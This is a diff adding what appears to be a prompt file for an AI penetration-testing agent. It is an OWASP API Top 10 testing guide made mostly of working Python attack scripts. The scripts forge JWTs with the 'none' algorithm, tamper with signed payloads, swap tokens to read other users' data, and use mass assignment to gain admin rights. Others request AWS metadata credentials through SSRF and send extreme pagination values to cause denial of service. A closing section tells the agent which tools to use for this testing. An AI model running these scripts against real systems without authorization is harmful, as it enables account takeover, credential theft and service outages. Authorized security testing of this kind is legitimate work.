@@ -1,0 +1,752 @@
+<owasp_top10_testing_guide>
+<title>OWASP API TOP 10 TESTING GUIDE (AKTO-INSPIRED)</title>
+
+<critical>This guide provides proven POC patterns from Akto API Security tests library for detecting OWASP API Top 10 vulnerabilities with high accuracy and low false positives.</critical>
+
+<api1_broken_object_level_authorization>
+<title>API1:2023 - Broken Object Level Authorization (BOLA/IDOR)</title>
+
+**Test 1: BOLA by Changing Auth Token (Akto POC)**
+```python
+# Use python tool for BOLA testing
+import requests
+
+def test_bola_token_swap(api_endpoint, user1_token, user2_token, resource_id):
+    """
+    Test BOLA by swapping authentication tokens.
+    Based on Akto test: BOLA by changing auth token
+    """
+    
+    # Step 1: User 1 accesses their own resource
+    resp1 = requests.get(
+        f"{api_endpoint}/{resource_id}",
+        headers={"Authorization": f"Bearer {user1_token}"}
+    )
+    
+    if resp1.status_code != 200:
+        print("[-] User 1 cannot access resource")
+        return False
+    
+    user1_data = resp1.json()
+    print(f"[+] User 1 data: {user1_data.get('email', 'N/A')}")
+    
+    # Step 2: User 2 attempts to access User 1's resource
+    resp2 = requests.get(
+        f"{api_endpoint}/{resource_id}",
+        headers={"Authorization": f"Bearer {user2_token}"}
+    )
+    
+    if resp2.status_code == 200:
+        user2_data = resp2.json()
+        # Check if User 2 got User 1's data
+        if user2_data.get('email') == user1_data.get('email'):
+            print("[!] BOLA DETECTED: User 2 accessed User 1's data")
+            return True
+    
+    print("[-] BOLA not present")
+    return False
+
+# Execute
+test_bola_token_swap(
+    "https://api.example.com/users",
+    "user1_token_here",
+    "user2_token_here",
+    "user1_resource_id"
+)
+```
+
+**Test 2: BOLA by Parameter Pollution (Akto POC)**
+```python
+def test_bola_parameter_pollution(api_endpoint, attacker_token, victim_id):
+    """
+    Test BOLA using parameter pollution.
+    Based on Akto test: BOLA by Parameter Pollution
+    """
+    
+    # Try different parameter pollution techniques
+    pollution_tests = [
+        # Duplicate parameters
+        f"{api_endpoint}?user_id={victim_id}&user_id=attacker_id",
+        f"{api_endpoint}?id={victim_id}&id=attacker_id",
+        
+        # Array injection
+        f"{api_endpoint}?user_id[]={victim_id}",
+        f"{api_endpoint}?user_id[0]={victim_id}",
+        
+        # JSON parameter pollution
+        {"user_id": [victim_id, "attacker_id"]},
+        {"user_id": victim_id, "id": "attacker_id"},
+    ]
+    
+    for test in pollution_tests:
+        if isinstance(test, dict):
+            resp = requests.post(
+                api_endpoint,
+                json=test,
+                headers={"Authorization": f"Bearer {attacker_token}"}
+            )
+        else:
+            resp = requests.get(
+                test,
+                headers={"Authorization": f"Bearer {attacker_token}"}
+            )
+        
+        if resp.status_code == 200 and victim_id in resp.text:
+            print(f"[!] BOLA via parameter pollution: {test}")
+            return True
+    
+    return False
+
+# Execute
+test_bola_parameter_pollution(
+    "https://api.example.com/profile",
+    "attacker_token",
+    "victim_user_123"
+)
+```
+
+**Test 3: BOLA in Old API Versions (Akto POC)**
+```python
+def test_bola_old_api_versions(base_url, attacker_token, victim_resource):
+    """
+    Test BOLA in old API versions.
+    Based on Akto test: BOLA in old API versions
+    """
+    
+    # API version variations
+    versions = ["v1", "v2", "v3", "api/v1", "api/v2"]
+    
+    for version in versions:
+        url = f"{base_url}/{version}/users/{victim_resource}"
+        
+        resp = requests.get(
+            url,
+            headers={"Authorization": f"Bearer {attacker_token}"}
+        )
+        
+        if resp.status_code == 200:
+            print(f"[!] BOLA in {version}: {url}")
+            print(f"    Response: {resp.text[:200]}")
+
+# Execute
+test_bola_old_api_versions(
+    "https://api.example.com",
+    "attacker_token",
+    "victim_user_123"
+)
+```
+</api1_broken_object_level_authorization>
+
+<api2_broken_authentication>
+<title>API2:2023 - Broken Authentication</title>
+
+**Test 1: Broken Authentication by Removing Token (Akto POC)**
+```python
+def test_broken_auth_no_token(api_endpoint):
+    """
+    Test if API works without authentication token.
+    Based on Akto test: Broken user authentication by removing auth token
+    """
+    
+    # Test without any authentication
+    resp = requests.get(api_endpoint)
+    
+    if resp.status_code == 200:
+        print("[!] BROKEN AUTH: API accessible without token")
+        print(f"    Response: {resp.text[:200]}")
+        return True
+    
+    # Test with empty/invalid token
+    invalid_tokens = ["", "null", "undefined", "Bearer ", "Bearer null"]
+    
+    for token in invalid_tokens:
+        resp = requests.get(
+            api_endpoint,
+            headers={"Authorization": token}
+        )
+        
+        if resp.status_code == 200:
+            print(f"[!] BROKEN AUTH: API accepts invalid token: {token}")
+            return True
+    
+    return False
+
+# Execute
+test_broken_auth_no_token("https://api.example.com/admin/users")
+```
+
+**Test 2: JWT None Algorithm Attack (Akto POC)**
+```python
+def test_jwt_none_algo(api_endpoint, valid_jwt):
+    """
+    Test JWT None algorithm vulnerability.
+    Based on Akto test: JWT None algo attack
+    """
+    import base64
+    import json
+    
+    # Parse existing JWT
+    parts = valid_jwt.split('.')
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    
+    # Modify header to use 'none' algorithm
+    header['alg'] = 'none'
+    
+    # Reconstruct JWT without signature
+    new_header = base64.urlsafe_b64encode(
+        json.dumps(header).encode()
+    ).decode().rstrip('=')
+    
+    new_payload = base64.urlsafe_b64encode(
+        json.dumps(payload).encode()
+    ).decode().rstrip('=')
+    
+    # JWT with none algorithm (no signature)
+    none_jwt = f"{new_header}.{new_payload}."
+    
+    # Test with none algorithm JWT
+    resp = requests.get(
+        api_endpoint,
+        headers={"Authorization": f"Bearer {none_jwt}"}
+    )
+    
+    if resp.status_code == 200:
+        print("[!] JWT NONE ALGO ATTACK: Server accepts 'none' algorithm")
+        return True
+    
+    return False
+
+# Execute
+test_jwt_none_algo(
+    "https://api.example.com/profile",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"
+)
+```
+
+**Test 3: JWT Failed to Verify Signature (Akto POC)**
+```python
+def test_jwt_signature_verification(api_endpoint, valid_jwt):
+    """
+    Test if JWT signature is properly verified.
+    Based on Akto test: JWT failed to verify signature test
+    """
+    import base64
+    import json
+    
+    # Parse JWT
+    parts = valid_jwt.split('.')
+    header = parts[0]
+    payload_b64 = parts[1]
+    
+    # Decode and modify payload
+    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
+    payload['role'] = 'admin'  # Privilege escalation
+    payload['user_id'] = '1'   # Change to admin ID
+    
+    # Re-encode modified payload
+    modified_payload = base64.urlsafe_b64encode(
+        json.dumps(payload).encode()
+    ).decode().rstrip('=')
+    
+    # Use original signature with modified payload
+    tampered_jwt = f"{header}.{modified_payload}.{parts[2]}"
+    
+    # Test with tampered JWT
+    resp = requests.get(
+        api_endpoint,
+        headers={"Authorization": f"Bearer {tampered_jwt}"}
+    )
+    
+    if resp.status_code == 200:
+        print("[!] JWT SIGNATURE NOT VERIFIED: Server accepts tampered JWT")
+        print(f"    Modified payload: {payload}")
+        return True
+    
+    return False
+
+# Execute
+test_jwt_signature_verification(
+    "https://api.example.com/admin/dashboard",
+    "valid_jwt_token_here"
+)
+```
+</api2_broken_authentication>
+
+<api3_broken_object_property_level_authorization>
+<title>API3:2023 - Broken Object Property Level Authorization</title>
+
+**Test: Mass Assignment Vulnerability (Akto-inspired)**
+```python
+def test_mass_assignment_comprehensive(api_endpoint, user_token):
+    """
+    Test for mass assignment vulnerabilities.
+    Akto-inspired comprehensive test
+    """
+    
+    # Sensitive fields to test
+    sensitive_fields = {
+        # Privilege escalation
+        "role": "admin",
+        "is_admin": True,
+        "admin": True,
+        "privilege_level": 10,
+        "access_level": "admin",
+        
+        # Account manipulation
+        "balance": 999999,
+        "credits": 999999,
+        "subscription": "premium",
+        "plan": "enterprise",
+        
+        # User impersonation
+        "user_id": "1",
+        "account_id": "admin",
+        "email": "admin@example.com",
+        
+        # Internal flags
+        "verified": True,
+        "approved": True,
+        "active": True,
+        "internal": True,
+    }
+    
+    for field, value in sensitive_fields.items():
+        payload = {field: value}
+        
+        # Test with PATCH
+        resp = requests.patch(
+            api_endpoint,
+            json=payload,
+            headers={"Authorization": f"Bearer {user_token}"}
+        )
+        
+        if resp.status_code in [200, 204]:
+            # Verify if field was actually updated
+            verify_resp = requests.get(
+                api_endpoint,
+                headers={"Authorization": f"Bearer {user_token}"}
+            )
+            
+            if verify_resp.status_code == 200:
+                data = verify_resp.json()
+                if data.get(field) == value:
+                    print(f"[!] MASS ASSIGNMENT: {field}={value}")
+                    print(f"    Verified: {data}")
+                    return True
+
+# Execute
+test_mass_assignment_comprehensive(
+    "https://api.example.com/users/profile",
+    "user_token_here"
+)
+```
+</api3_broken_object_property_level_authorization>
+
+<api5_broken_function_level_authorization>
+<title>API5:2023 - Broken Function Level Authorization</title>
+
+**Test: BFLA by Changing HTTP Method (Akto POC)**
+```python
+def test_bfla_http_method(api_endpoint, user_token):
+    """
+    Test BFLA by changing HTTP methods.
+    Based on Akto test: Broken Function Level Authorization by changing HTTP Method
+    """
+    
+    # HTTP methods to test
+    methods = {
+        "GET": requests.get,
+        "POST": requests.post,
+        "PUT": requests.put,
+        "PATCH": requests.patch,
+        "DELETE": requests.delete,
+        "OPTIONS": requests.options,
+        "HEAD": requests.head,
+    }
+    
+    headers = {"Authorization": f"Bearer {user_token}"}
+    
+    for method_name, method_func in methods.items():
+        try:
+            resp = method_func(api_endpoint, headers=headers, timeout=5)
+            
+            if resp.status_code in [200, 201, 204]:
+                print(f"[!] BFLA: {method_name} method allowed")
+                print(f"    Status: {resp.status_code}")
+                
+                # Check for admin/privileged indicators
+                if resp.text and any(ind in resp.text.lower() for ind in 
+                                    ["admin", "delete", "update", "modify"]):
+                    print(f"    [!] CRITICAL: Privileged action via {method_name}")
+                    
+        except Exception as e:
+            pass
+
+# Execute
+test_bfla_http_method(
+    "https://api.example.com/admin/users/123",
+    "regular_user_token"
+)
+```
+</api5_broken_function_level_authorization>
+
+<api7_server_side_request_forgery>
+<title>API7:2023 - Server Side Request Forgery</title>
+
+**Test: SSRF - AWS Sensitive Data Exposed (Akto POC)**
+```python
+def test_ssrf_aws_metadata(api_endpoint, url_param="url"):
+    """
+    Test SSRF to access AWS metadata.
+    Based on Akto test: SSRF - AWS sensitive data exposed
+    """
+    
+    # AWS metadata endpoints
+    aws_endpoints = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        
+        # IMDSv2 token endpoint
+        "http://169.254.169.254/latest/api/token",
+    ]
+    
+    for endpoint in aws_endpoints:
+        resp = requests.post(
+            api_endpoint,
+            json={url_param: endpoint},
+            timeout=10
+        )
+        
+        # Check for AWS-specific indicators
+        aws_indicators = [
+            "ami-id", "instance-id", "iam", "security-credentials",
+            "region", "accountId", "privateIp", "devpayProductCodes"
+        ]
+        
+        if any(indicator in resp.text for indicator in aws_indicators):
+            print(f"[!] SSRF - AWS METADATA EXPOSED: {endpoint}")
+            print(f"    Response: {resp.text[:300]}")
+            return True
+    
+    return False
+
+# Execute
+test_ssrf_aws_metadata("https://api.example.com/fetch", "url")
+```
+</api7_server_side_request_forgery>
+
+<api8_security_misconfiguration>
+<title>API8:2023 - Security Misconfiguration</title>
+
+**Test 1: Swagger File Detection (Akto POC)**
+```python
+def test_swagger_exposure(base_url):
+    """
+    Test for exposed Swagger/OpenAPI documentation.
+    Based on Akto test: Swagger file detection - Security misconfiguration
+    """
+    
+    # Common Swagger/OpenAPI paths
+    swagger_paths = [
+        "/swagger.json",
+        "/swagger.yaml",
+        "/swagger/v1/swagger.json",
+        "/swagger/v2/swagger.json",
+        "/api/swagger.json",
+        "/api-docs",
+        "/api-docs/swagger.json",
+        "/v2/api-docs",
+        "/v3/api-docs",
+        "/openapi.json",
+        "/openapi.yaml",
+        "/docs",
+        "/swagger-ui.html",
+        "/swagger-ui/",
+        "/api/swagger-ui.html",
+    ]
+    
+    for path in swagger_paths:
+        url = f"{base_url}{path}"
+        resp = requests.get(url, timeout=5)
+        
+        if resp.status_code == 200:
+            # Check for Swagger/OpenAPI indicators
+            indicators = ["swagger", "openapi", "paths", "definitions", "components"]
+            if any(ind in resp.text.lower() for ind in indicators):
+                print(f"[!] SWAGGER EXPOSED: {url}")
+                print(f"    Size: {len(resp.text)} bytes")
+                return True
+    
+    return False
+
+# Execute
+test_swagger_exposure("https://api.example.com")
+```
+
+**Test 2: Exposed Metrics Endpoint (Akto POC)**
+```python
+def test_exposed_metrics(base_url):
+    """
+    Test for exposed metrics endpoints.
+    Based on Akto test: API security misconfiguration - exposed metrics endpoint
+    """
+    
+    # Common metrics endpoints
+    metrics_paths = [
+        "/metrics",
+        "/actuator/metrics",
+        "/actuator/prometheus",
+        "/prometheus",
+        "/stats",
+        "/status",
+        "/health",
+        "/actuator/health",
+        "/actuator/info",
+        "/actuator/env",
+        "/actuator/configprops",
+        "/debug/vars",
+        "/debug/pprof",
+    ]
+    
+    for path in metrics_paths:
+        url = f"{base_url}{path}"
+        resp = requests.get(url, timeout=5)
+        
+        if resp.status_code == 200:
+            # Check for metrics indicators
+            indicators = [
+                "jvm", "memory", "threads", "cpu", "heap",
+                "prometheus", "metrics", "gauge", "counter"
+            ]
+            if any(ind in resp.text.lower() for ind in indicators):
+                print(f"[!] METRICS EXPOSED: {url}")
+                print(f"    Response: {resp.text[:200]}")
+                return True
+    
+    return False
+
+# Execute
+test_exposed_metrics("https://api.example.com")
+```
+
+**Test 3: Django Debug Page Exposed (Akto POC)**
+```python
+def test_django_debug_exposure(base_url):
+    """
+    Test for exposed Django debug pages.
+    Based on Akto test: Security misconfiguration - django-exposed-debug-page
+    """
+    
+    # Trigger Django debug page
+    debug_triggers = [
+        "/__debug__/",
+        "/?debug=true",
+        "/admin/login/?next=/admin/",
+        "/static/admin/",
+    ]
+    
+    for trigger in debug_triggers:
+        url = f"{base_url}{trigger}"
+        resp = requests.get(url, timeout=5)
+        
+        # Check for Django debug indicators
+        if "DEBUG = True" in resp.text or "Traceback" in resp.text:
+            print(f"[!] DJANGO DEBUG EXPOSED: {url}")
+            return True
+    
+    return False
+
+# Execute
+test_django_debug_exposure("https://api.example.com")
+```
+</api8_security_misconfiguration>
+
+<api9_improper_inventory_management>
+<title>API9:2023 - Improper Inventory Management</title>
+
+**Test: Old API Versions Discovery (Akto-inspired)**
+```python
+def test_old_api_versions_comprehensive(base_url):
+    """
+    Discover and test old API versions.
+    Akto-inspired comprehensive version discovery
+    """
+    
+    # Version patterns
+    version_patterns = [
+        "v1", "v2", "v3", "v4", "v5",
+        "api/v1", "api/v2", "api/v3",
+        "1.0", "2.0", "3.0",
+        "api/1.0", "api/2.0",
+        "v1.0", "v2.0",
+        "alpha", "beta", "dev", "test",
+    ]
+    
+    # Common endpoints to test
+    endpoints = ["/users", "/profile", "/admin", "/config"]
+    
+    for version in version_patterns:
+        for endpoint in endpoints:
+            url = f"{base_url}/{version}{endpoint}"
+            
+            resp = requests.get(url, timeout=5)
+            
+            if resp.status_code == 200:
+                print(f"[+] Old API version found: {url}")
+                
+                # Test if it has weaker security
+                # Try without auth
+                resp_no_auth = requests.get(url)
+                if resp_no_auth.status_code == 200:
+                    print(f"    [!] NO AUTH REQUIRED in old version!")
+
+# Execute
+test_old_api_versions_comprehensive("https://api.example.com")
+```
+</api9_improper_inventory_management>
+
+<api10_unsafe_consumption>
+<title>API10:2023 - Unsafe Consumption of APIs</title>
+
+**Test: Application DOS via Pagination (Akto POC)**
+```python
+def test_pagination_dos(api_endpoint):
+    """
+    Test for DOS via pagination misconfiguration.
+    Based on Akto test: Application DOS due to pagination misconfiguration
+    """
+    
+    # Extreme pagination values
+    dos_params = [
+        {"limit": 999999, "offset": 0},
+        {"limit": -1, "offset": 0},
+        {"page_size": 999999},
+        {"per_page": 999999},
+        {"count": 999999},
+        {"limit": "999999999999999999"},  # Integer overflow
+    ]
+    
+    for params in dos_params:
+        try:
+            import time
+            start = time.time()
+            
+            resp = requests.get(
+                api_endpoint,
+                params=params,
+                timeout=30
+            )
+            
+            elapsed = time.time() - start
+            
+            # Check for DOS indicators
+            if elapsed > 10:  # Took more than 10 seconds
+                print(f"[!] PAGINATION DOS: {params}")
+                print(f"    Response time: {elapsed:.2f}s")
+                return True
+                
+            if resp.status_code == 500:
+                print(f"[!] PAGINATION ERROR: {params}")
+                print(f"    Server error triggered")
+                return True
+                
+        except requests.Timeout:
+            print(f"[!] PAGINATION TIMEOUT: {params}")
+            return True
+        except Exception as e:
+            pass
+    
+    return False
+
+# Execute
+test_pagination_dos("https://api.example.com/users")
+```
+</api10_unsafe_consumption>
+
+<complete_owasp_workflow>
+**End-to-End OWASP Top 10 Testing (Akto-style)**
+```python
+#!/usr/bin/env python3
+"""
+Complete OWASP API Top 10 Testing Workflow
+Based on Akto API Security tests library
+Save to /workspace/owasp_top10_test.py
+"""
+import requests
+
+def main():
+    base_url = "https://api.example.com"
+    user_token = "user_token_here"
+    admin_token = "admin_token_here"
+    
+    print("[*] Starting OWASP API Top 10 testing...")
+    
+    # API1: BOLA
+    print("\n[API1] Testing Broken Object Level Authorization...")
+    test_bola_token_swap(f"{base_url}/users", user_token, admin_token, "user_id_123")
+    test_bola_parameter_pollution(f"{base_url}/profile", user_token, "victim_id")
+    test_bola_old_api_versions(base_url, user_token, "victim_resource")
+    
+    # API2: Broken Authentication
+    print("\n[API2] Testing Broken Authentication...")
+    test_broken_auth_no_token(f"{base_url}/admin/users")
+    test_jwt_none_algo(f"{base_url}/profile", user_token)
+    test_jwt_signature_verification(f"{base_url}/admin", user_token)
+    
+    # API3: Broken Object Property Level Authorization
+    print("\n[API3] Testing Mass Assignment...")
+    test_mass_assignment_comprehensive(f"{base_url}/users/profile", user_token)
+    
+    # API5: BFLA
+    print("\n[API5] Testing Broken Function Level Authorization...")
+    test_bfla_http_method(f"{base_url}/admin/users/123", user_token)
+    
+    # API7: SSRF
+    print("\n[API7] Testing SSRF...")
+    test_ssrf_aws_metadata(f"{base_url}/fetch", "url")
+    
+    # API8: Security Misconfiguration
+    print("\n[API8] Testing Security Misconfiguration...")
+    test_swagger_exposure(base_url)
+    test_exposed_metrics(base_url)
+    test_django_debug_exposure(base_url)
+    
+    # API9: Improper Inventory Management
+    print("\n[API9] Testing Old API Versions...")
+    test_old_api_versions_comprehensive(base_url)
+    
+    # API10: Unsafe Consumption
+    print("\n[API10] Testing Pagination DOS...")
+    test_pagination_dos(f"{base_url}/users")
+    
+    print("\n[*] OWASP API Top 10 testing complete!")
+
+if __name__ == "__main__":
+    main()
+```
+</complete_owasp_workflow>
+
+<tool_selection>
+**When to use each tool:**
+
+1. **python tool** (PRIMARY):
+   - All OWASP Top 10 automated testing
+   - Token manipulation and JWT testing
+   - Pagination and DOS testing
+
+2. **terminal tool**:
+   - Running specialized scanners
+   - Quick curl-based tests
+
+3. **browser_action tool**:
+   - Testing web UI for misconfigurations
+   - Visual confirmation of exposed endpoints
+
+4. **web_search tool**:
+   - Finding latest OWASP testing techniques
+   - Researching framework-specific vulnerabilities
+</tool_selection>
+</owasp_top10_testing_guide>
